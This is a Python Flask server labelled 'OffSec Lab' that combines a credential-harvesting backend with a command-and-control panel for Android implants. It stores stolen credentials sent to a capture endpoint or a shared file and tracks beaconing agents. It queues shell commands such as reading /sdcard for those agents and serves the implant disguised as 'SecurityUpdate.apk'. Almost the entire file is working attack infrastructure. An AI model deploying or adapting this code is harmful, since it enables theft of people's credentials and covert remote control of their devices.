#!/usr/bin/env python3
"""
Unified Dashboard — Credential Farming + C2 Control
Single port 4443. Reads creds from working dir (shared JSONL file).
"""
import sys, os, json, time, threading
from datetime import datetime
from flask import Flask, request, jsonify, send_file, redirect

PORT = 4443
APK_PATHS = [
    "/tmp/c2agent/build/apk/c2agent.apk",
    os.path.expanduser("~/Documents/MYPROJECT/TOOLS/hybrid-mitm-c2/c2-lab-agent.apk"),
]
SHARED_CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "WEF", "creds.jsonl")

app = Flask(__name__)

# ========== DATA STORES ==========
agents = {}
command_queue = {}
captured_creds = []

# ========== FILE WATCHER ==========
def watch_creds_file():
    """Background thread: poll shared creds file for new entries"""
    global captured_creds
    pos = 0
    while True:
        try:
            if os.path.exists(SHARED_CREDS_FILE):
                with open(SHARED_CREDS_FILE, "r") as f:
                    f.seek(pos)
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                entry = json.loads(line)
                                entry.setdefault("time", datetime.now().strftime("%H:%M:%S"))
                                entry.setdefault("ip", "?")
                                captured_creds.append(entry)
                                fields = " | ".join(f"{k}={str(v)[:30]}" for k, v in entry.items() if k not in ("_ua","_time","_ip"))
                                print(f"\n[!] NEW CREDENTIAL: {fields[:120]}")
                            except json.JSONDecodeError:
                                pass
                    pos = f.tell()
        except Exception as e:
            pass
        time.sleep(1)

# ========== CREDENTIAL VIEWER ==========
@app.route('/capture')
def capture():
    """Direct capture via GET (fallback, file-based is primary)"""
    global captured_creds
    params = dict(request.args)
    if params:
        params["time"] = datetime.now().strftime("%H:%M:%S")
        params["ip"] = request.remote_addr
        captured_creds.append(params)
        print(f"[!] DIRECT CAPTURE: {list(params.values())[:3]}")
    return "OK"

@app.route('/creds')
def view_creds():
    rows = ""
    for c in reversed(captured_creds[-50:]):
        time_str = c.get("time") or c.get("_time", "?")
        ip = c.get("ip") or c.get("_ip", "?")
        fields = "<br>".join(
            f"<b>{k}:</b> {str(v)[:60]}"
            for k, v in c.items()
            if k not in ("time", "ip", "_time", "_ip", "_ua")
        )
        rows += f'''<tr><td>{time_str}</td><td>{ip}</td>
            <td style="text-align:left;max-width:500px;word-break:break-all">{fields}</td></tr>'''

    return f'''<!DOCTYPE html>
<html><head><title>Credentials</title><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{{font-family:monospace;margin:0;padding:0;box-sizing:border-box}}
body{{background:#0d1117;color:#c9d1d9;padding:20px}}
h1{{color:#58a6ff;margin-bottom:16px}}
table{{width:100%;border-collapse:collapse}}
th,td{{padding:8px 12px;border-bottom:1px solid #30363d;text-align:center;font-size:12px}}
th{{background:#161b22;color:#58a6ff;position:sticky;top:0}}
tr:hover{{background:#161b22}}
.back{{color:#58a6ff;text-decoration:none;margin-bottom:16px;display:inline-block}}
.count{{color:#3fb950;font-weight:bold}}
</style></head><body>
<a class="back" href="/">← Dashboard</a>
<h1>Captured Credentials <span class="count">({len(captured_creds)})</span></h1>
<table><tr><th>Time</th><th>IP</th><th>Fields</th></tr>
{rows}</table>
</body></html>'''

# ========== C2 AGENT ==========
@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.form.to_dict()
    agent_id = data.get('id', 'unknown')
    if agent_id not in agents:
        agents[agent_id] = {
            'first_seen': datetime.now().strftime('%H:%M:%S'),
            'device': data.get('device', '?'),
            'model': data.get('model', '?'),
            'brand': data.get('brand', '?'),
            'release': data.get('release', '?'),
            'network': data.get('network', '?'),
            'last_seen': datetime.now().strftime('%H:%M:%S'),
            'results': []
        }
        print(f"[+] NEW AGENT: {agent_id[:16]}... ({data.get('model','?')})")
    else:
        agents[agent_id]['last_seen'] = datetime.now().strftime('%H:%M:%S')
        agents[agent_id]['network'] = data.get('network', '?')
    print(f"[BEACON] {agent_id[:12]}... | {data.get('model','?')}")
    pending = command_queue.pop(agent_id, [])
    return jsonify({'commands': pending, 'interval': 30})

@app.route('/results', methods=['POST'])
def results():
    data = request.form.to_dict()
    agent_id = data.get('id', 'unknown')
    output = data.get('output', '')
    if agent_id in agents:
        agents[agent_id]['results'].append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'output': output[:500]
        })
    print(f"[RESULT] {agent_id[:12]}...: {output[:100]}")
    return 'OK'

@app.route('/delete/<agent_id>')
def delete_agent(agent_id):
    if agent_id in agents:
        del agents[agent_id]
        command_queue.pop(agent_id, None)
        print(f"[-] DELETED agent: {agent_id[:16]}...")
    return redirect('/')

# ========== UNIFIED DASHBOARD ==========
@app.route('/')
@app.route('/admin', methods=['GET', 'POST'])
def dashboard():
    target = request.args.get('target') or (request.form.get('target') if request.method == 'POST' else None)
    cmd = request.args.get('cmd') or (request.form.get('cmd') if request.method == 'POST' else None)
    if target and cmd:
        if target not in command_queue:
            command_queue[target] = []
        command_queue[target].append(cmd)
        print(f"[CMD] Queued '{cmd}' for {target[:16]}...")

    # Credential rows (last 8)
    cred_rows = ""
    for c in reversed(captured_creds[-8:]):
        time_str = c.get("time") or c.get("_time", "?")
        ip = c.get("ip") or c.get("_ip", "?")
        fields = ", ".join(
            f"{k}={str(v)[:25]}"
            for k, v in c.items()
            if k not in ("time", "ip", "_time", "_ip", "_ua")
        )
        cred_rows += f'<tr><td>{time_str}</td><td>{ip}</td><td style="text-align:left;max-width:300px;word-break:break-all">{fields}</td></tr>'
    if not cred_rows:
        cred_rows = '<tr><td colspan="3" style="color:#8b949e">Waiting for credentials...</td></tr>'

    # Agent rows
    agent_rows = ""
    results_html = ""
    for aid, info in list(agents.items())[-8:]:
        agent_rows += f'''<tr><td>{aid[:16]}...</td>
            <td>{info.get('brand','?')} {info.get('model','?')}</td>
            <td>{info.get('release','?')}</td>
            <td>{info.get('network','?')}</td>
            <td>{info.get('last_seen','?')}</td>
            <td>{len(info.get('results',[]))}</td>
            <td><a href="/delete/{aid}" onclick="return confirm('Delete this agent?')" style="color:#da3633;text-decoration:none;font-size:11px">✕</a></td></tr>'''
        for r in info.get('results', [])[-3:]:
            results_html += f'<div style="background:#161b22;border:1px solid #30363d;padding:6px;margin:4px 0;border-radius:4px;font-size:11px;white-space:pre-wrap;word-break:break-all">[<b style="color:#58a6ff">{r.get("time","?")}</b>] {r.get("output","")[:200]}</div>'
    if not agent_rows:
        agent_rows = '<tr><td colspan="7" style="color:#8b949e">No agents connected yet</td></tr>'
    if not results_html:
        results_html = '<div style="color:#8b949e;font-size:11px;padding:8px">No command results yet</div>'

    agent_opts = "".join(
        f'<option value="{aid}">{aid[:12]}... ({agents[aid].get("model","?")})</option>'
        for aid in agents
    ) or '<option value="">-- No agents --</option>'

    return f'''<!DOCTYPE html>
<html><head><title>OffSec Lab</title><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{{font-family:monospace;margin:0;padding:0;box-sizing:border-box}}
body{{background:#0d1117;color:#c9d1d9;padding:20px}}
h1{{color:#58a6ff;margin-bottom:4px;font-size:18px}}
.sub{{font-size:12px;color:#8b949e;margin-bottom:16px}}
.grid{{display:grid;gap:16px}}
@media(min-width:768px){{.grid{{grid-template-columns:1fr 1fr}}}} 
table{{width:100%;border-collapse:collapse;margin-bottom:12px}}
th,td{{padding:6px 8px;border-bottom:1px solid #30363d;text-align:center;font-size:11px}}
th{{background:#161b22;color:#58a6ff}}
tr:hover{{background:#161b22}}
.cmd-box{{background:#161b22;border:1px solid #30363d;padding:12px;border-radius:6px;margin-bottom:12px}}
label{{display:block;margin-bottom:4px;color:#8b949e;font-size:11px}}
select,input,button{{width:100%;padding:8px;margin-bottom:8px;background:#0d1117;
    border:1px solid #30363d;color:#c9d1d9;border-radius:4px;font-size:12px}}
button{{background:#238636;color:#fff;cursor:pointer;font-weight:bold}}
button:hover{{background:#2ea043}}
.count{{color:#3fb950;font-weight:bold}}
.footer{{margin-top:16px;font-size:11px;color:#8b949e;text-align:center}}
.section h2{{color:#58a6ff;margin-bottom:6px;font-size:14px}}
.btn-refresh{{background:#30363d;color:#58a6ff;border:1px solid #30363d;padding:4px 12px;
    border-radius:4px;cursor:pointer;font-size:11px;width:auto;margin-left:8px}}
.btn-refresh:hover{{background:#484f58}}
</style></head><body>
<h1>OffSec Lab — Dashboard</h1>
<p class="sub">Last refresh: {datetime.now().strftime("%H:%M:%S")} | 
<button class="btn-refresh" onclick="location.reload()">↻ Refresh Now</button> |
<a href="/creds" style="color:#58a6ff">Full Credentials</a> |
<a href="/download" style="color:#58a6ff">APK Download</a></p>

<div class="grid">
<div>
    <div class="section"><h2>Credentials <span class="count">({len(captured_creds)})</span></h2>
    <table><tr><th>Time</th><th>IP</th><th>Fields</th></tr>{cred_rows}</table></div>
</div>
<div>
    <div class="section"><h2>C2 Agents <span class="count">({len(agents)})</span></h2>
    <table><tr><th>ID</th><th>Device</th><th>Ver</th><th>Net</th><th>Seen</th><th>Res</th><th>Del</th></tr>{agent_rows}</table></div>
    <div class="cmd-box"><h3 style="color:#58a6ff;margin-bottom:8px">Send Command</h3>
    <form method="GET" action="/admin" id="cmdForm">
    <label>Agent:</label><select name="target" id="agentSelect">{agent_opts}</select>
    <label>Command (e.g. shell:id, shell:ls /sdcard):</label>
    <input type="text" name="cmd" id="cmdInput" placeholder="shell:id" value="shell:id">
    <button type="submit">SEND COMMAND</button></form></div>
    <div class="section"><h3 style="color:#58a6ff;margin-bottom:6px;font-size:13px">Command Results</h3>
    {results_html}</div>
</div></div>
<div class="footer">C2 Beacon: :{PORT}/beacon | Shared file: {SHARED_CREDS_FILE}</div>
<script>
var agentSel = document.getElementById('agentSelect');
var cmdInput = document.getElementById('cmdInput');
if (agentSel && localStorage.getItem('c2_agent')) agentSel.value = localStorage.getItem('c2_agent');
if (cmdInput && localStorage.getItem('c2_cmd')) cmdInput.value = localStorage.getItem('c2_cmd');
if (agentSel) agentSel.addEventListener('change', function(){{ localStorage.setItem('c2_agent', this.value); }});
if (cmdInput) cmdInput.addEventListener('input', function(){{ localStorage.setItem('c2_cmd', this.value); }});
setTimeout(function(){{ location.reload(); }}, 30000);
</script>
</body></html>'''

# ========== APK DOWNLOAD ==========
@app.route('/download')
def download_apk():
    for p in APK_PATHS:
        if os.path.exists(p):
            return send_file(p, as_attachment=True,
                download_name="SecurityUpdate.apk",
                mimetype="application/vnd.android.package-archive")
    return "<h1>404 - APK not found</h1>", 404

# ========== MAIN ==========
if __name__ == '__main__':
    # Touch shared creds file (handle gracefully if root-owned)
    try:
        if not os.path.exists(SHARED_CREDS_FILE):
            open(SHARED_CREDS_FILE, "w").close()
        os.chmod(SHARED_CREDS_FILE, 0o666)
    except Exception:
        pass

    print("=" * 60)
    print("  OFFSEC LAB — UNIFIED DASHBOARD")
    print("=" * 60)
    print(f"  Dashboard:            http://0.0.0.0:{PORT}/")
    print(f"  Credentials:          http://0.0.0.0:{PORT}/creds")
    print(f"  C2 Beacon:            http://0.0.0.0:{PORT}/beacon")
    print(f"  APK Download:         http://0.0.0.0:{PORT}/download")
    print(f"  Shared creds file:    {SHARED_CREDS_FILE}")
    print("=" * 60)

    # Start file watcher
    threading.Thread(target=watch_creds_file, daemon=True).start()

    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
